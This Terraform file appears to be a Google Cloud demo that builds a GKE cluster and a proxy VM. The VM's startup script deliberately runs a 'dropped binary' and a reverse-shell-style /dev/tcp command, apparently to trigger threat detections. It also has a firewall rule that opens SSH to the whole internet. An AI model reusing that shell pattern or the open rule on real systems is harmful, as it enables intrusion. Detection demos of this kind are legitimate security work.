/**
 * Copyright 2022 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */


## NOTE: This provides PoC demo environment for various use cases ##
##  This is not built for production workload ##


/*

data "google_project" "appmod_project" {
  project_id = google_project.demo_project.project_id
  depends_on = [time_sleep.wait_enable_service_api]
}

*/
locals {
   #GKE-Cluster locals
  memorystore_apis = ["redis.googleapis.com"]
  cluster_id_parts = split("/", google_container_cluster.my_cluster.id)
  cluster_name = element(local.cluster_id_parts, length(local.cluster_id_parts) - 1)
   
}

/*

# Create the host network
resource "google_compute_network" "demo_network" {
  project                 = google_project.demo_project.project_id
  name                    = var.vpc_network_name
  auto_create_subnetworks = false
  description             = "Host network for the Cloud SQL instance and proxy"
  depends_on = [time_sleep.wait_enable_service_api]
}

# Create  Subnetwork
resource "google_compute_subnetwork" "demo_subnetwork" {
  name          = "host-network-${var.network_region}"
  ip_cidr_range = "192.168.0.0/16"
  region        = var.network_region
  project = google_project.demo_project.project_id
  network       = google_compute_network.demo_network.self_link
 
  # Enabling VPC flow logs
 log_config {
    aggregation_interval = "INTERVAL_10_MIN"
    flow_sampling        = 0.5
    metadata             = "INCLUDE_ALL_METADATA"
  }
  private_ip_google_access   = true 
  depends_on = [
    google_compute_network.demo_network,
    time_sleep.wait_enable_service_api,
  ]
}


# Setup Private IP access
resource "google_compute_global_address" "sql_instance_private_ip" {
  name          = "sql-private-address"
  purpose       = "VPC_PEERING"
  address_type  = "INTERNAL"
  address       = "10.10.10.0"
  prefix_length = 24
  network       = google_compute_network.demo_network.id
  project = google_project.demo_project.project_id
  description = "Cloud SQL IP Range"
  depends_on = [
   time_sleep.wait_enable_service_api,
    google_compute_subnetwork.demo_subnetwork,
    ]  
}

# Create Private Connection:
resource "google_service_networking_connection" "private_vpc_connection" {
  network                 = google_compute_network.demo_network.id
  service                 = "servicenetworking.googleapis.com"
  reserved_peering_ranges = [google_compute_global_address.sql_instance_private_ip.name]
  depends_on = [
    google_compute_global_address.sql_instance_private_ip,
    ]
}



# Create a random id for the DB instance to avoid collision
resource "random_id" "id" {
  byte_length = 2
}

*/

# Creating GKE network
resource "google_compute_network" "cloud_gke_network" {
  project                 = google_project.demo_project.project_id
  name                    = "gke-network"
  auto_create_subnetworks = false
   depends_on = [
    time_sleep.wait_enable_service_api,
    ]
  }

# Creating GKE sub network
resource "google_compute_subnetwork" "cloud_gke_subnetwork" {
  name          = "cloud-gke-${var.network_region}"
  ip_cidr_range = "192.168.10.0/24"
  region        = var.network_region
  project = google_project.demo_project.project_id
  network       = google_compute_network.cloud_gke_network.self_link
  private_ip_google_access   = true 
  depends_on = [
    google_compute_network.cloud_gke_network,
  ]
}



# Create a CloudRouter
resource "google_compute_router" "gke_router" {
  project = google_project.demo_project.project_id
  name    = "gke-subnet-router"
  region  = google_compute_subnetwork.cloud_gke_subnetwork.region
  network = google_compute_network.cloud_gke_network.id

  bgp {
    asn = 64514
  }
}
 
# Configure a CloudNAT
resource "google_compute_router_nat" "gke_nats" {
  project = google_project.demo_project.project_id
  name                               = "nat-cloud-sql-${var.vpc_network_name}"
  router                             = google_compute_router.gke_router.name
  region                             = google_compute_router.gke_router.region
  nat_ip_allocate_option             = "AUTO_ONLY"
  source_subnetwork_ip_ranges_to_nat = "ALL_SUBNETWORKS_ALL_IP_RANGES"

  log_config {
    enable = true
    filter = "ERRORS_ONLY"
  }
  depends_on = [google_compute_router.gke_router]
}


resource "google_compute_firewall" "allow_http_icmp" {
name = "allow-http-icmp"
network = google_compute_network.cloud_gke_network.self_link
project = google_project.demo_project.project_id
direction = "INGRESS"
allow {
    protocol = "tcp"
    ports    = ["22"]
    }
 source_ranges = ["0.0.0.0/0"]

allow {
    protocol = "icmp"
    }
    depends_on = [
        google_compute_network.cloud_gke_network
    ]
} 




# Create GKE cluster
resource "google_container_cluster" "my_cluster" {
  name     = var.name
  location = var.network_region
  project  = google_project.demo_project.project_id
  # Enabling autopilot for this cluster
  enable_autopilot = true
#  binary_authorization {
#  evaluation_mode = "PROJECT_SINGLETON_POLICY_ENFORCE"
#  }
  network       = google_compute_network.cloud_gke_network.self_link
  subnetwork = google_compute_subnetwork.cloud_gke_subnetwork.self_link
  # Setting an empty ip_allocation_policy to allow autopilot cluster to spin up correctly
  
    ip_allocation_policy {
    cluster_ipv4_cidr_block       = "10.4.0.0/14"
    services_ipv4_cidr_block      = "10.8.0.0/20"
   }

  
    private_cluster_config {
    enable_private_nodes    = true
    enable_private_endpoint = true
    }

     master_authorized_networks_config {
        cidr_blocks {
        cidr_block   = "192.168.10.0/24"
        display_name = "internal"
      }
}  

  depends_on = [
#    google_binary_authorization_policy.this,
#    google_project_organization_policy.external_ip_access,
    ]
}


#Create the service Account
resource "google_service_account" "k8_ser_acc" {
   project = google_project.demo_project.project_id
   account_id   = "k8-service-account"
   display_name = "Kubernetes Proxy Service Account"
   depends_on = [
    time_sleep.wait_enable_service_api,
    ]
 }


resource "google_organization_iam_member" "k8_container_dev" {
    org_id  = var.organization_id
    role    = "roles/container.developer"
    member  = "serviceAccount:${google_service_account.k8_ser_acc.email}"
    depends_on = [
        google_service_account.k8_ser_acc,
        ]
    }



# Create Compute Instance (debian)
resource "google_compute_instance" "kubernetes_proxy_server1" {
    project      = google_project.demo_project.project_id
    name         = "kubernetes-proxy-server1"
    machine_type = "n2-standard-4"
    zone         = var.network_zone

    shielded_instance_config {
        enable_integrity_monitoring = true
        enable_secure_boot          = true
        enable_vtpm                 = true
    }

  depends_on = [
    time_sleep.wait_enable_service_api,
#    google_organization_iam_member.k8_proj_owner,
    google_service_account.k8_ser_acc,
    google_container_cluster.my_cluster,
    google_compute_router_nat.gke_nats,
    ]

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-10"
    }
 }

  network_interface {
  network       = google_compute_network.cloud_gke_network.self_link
  subnetwork = google_compute_subnetwork.cloud_gke_subnetwork.self_link
   
  }

  service_account {
    # Google recommends custom service accounts that have cloud-platform scope and permissions granted via IAM Roles.
    email                       = google_service_account.k8_ser_acc.email
    scopes                      = ["cloud-platform"]
  }
    metadata_startup_script     = "sudo apt-get update -y;sudo apt-get install git -y;sudo apt-get install kubectl;sudo apt-get install google-cloud-sdk-gke-gcloud-auth-plugin;git clone https://github.com/mgaur10/security-foundation-solution.git;sudo gcloud container clusters get-credentials ${local.cluster_name} --zone=us-east1 --project=${var.demo_project_id}${random_string.id.result};sudo kubectl apply -f /security-foundation-solution/release/kubernetes-manifests.yaml;sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c 'cp /bin/ls /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc); /tmp/dropped-binary-$(date -u +%Y-%m-%d-%H-%M-%S-utc)';sudo kubectl run --restart=Never --rm=true --wait=true -i --image marketplace.gcr.io/google/ubuntu1804:latest reverse-shell-$(date -u +%Y-%m-%d-%H-%M-%S-utc) -- bash -c '/bin/echo >& /dev/tcp/8.8.8.8/53 0>&1'"
    

    labels =   {
        asset_type = "prod"
        osshortname = "debian"  
        }
}










